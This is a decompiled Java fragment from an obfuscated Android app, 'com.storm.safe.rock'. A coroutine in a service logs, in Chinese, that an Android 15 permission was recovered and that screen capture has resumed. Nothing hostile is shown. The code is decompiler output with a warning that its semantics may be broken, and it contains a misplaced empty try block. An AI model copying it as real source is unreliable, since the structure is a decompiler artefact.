package com.storm.safe.rock.service;

import com.storm.safe.rock.manager.C0260a2;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$handleAndroid15PermissionRecovered$1", m214403f = "dqtvuisjd.kt", m214404l = {12442}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$handleAndroid15PermissionRecovered$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52548a1;

    /* renamed from: a2 */
    public final /* synthetic */ dqtvuisjd f52549a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$handleAndroid15PermissionRecovered$1(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52549a2 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$handleAndroid15PermissionRecovered$1(this.f52549a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$handleAndroid15PermissionRecovered$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        dqtvuisjd dqtvuisjdVar = this.f52549a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52548a1;
        try {
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 处理Android 15权限恢复失败", e);
        }
        if (i == 0) {
            kg1.m213544f4(obj);
            t60.m214714d6("dqtvuisjd", "✅ 处理Android 15权限恢复");
            C0260a2 c0260a2 = dqtvuisjdVar.f52369a0;
            if (c0260a2 != null) {
                c0260a2.m211325g8(false);
                t60.m214714d6("dqtvuisjd", "🛑 停止权限申请流程");
            }
            if (dqtvuisjdVar.f52370a1 != null) {
                this.f52548a1 = 1;
                if (b81.m210571b1(500L, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            }
            return C1351vv.f60710b1;
        }
        if (i != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        kg1.m213544f4(obj);
        t60.m214714d6("dqtvuisjd", "✅ 屏幕捕获已恢复（Android 15权限恢复）");
        return C1351vv.f60710b1;
    }
}
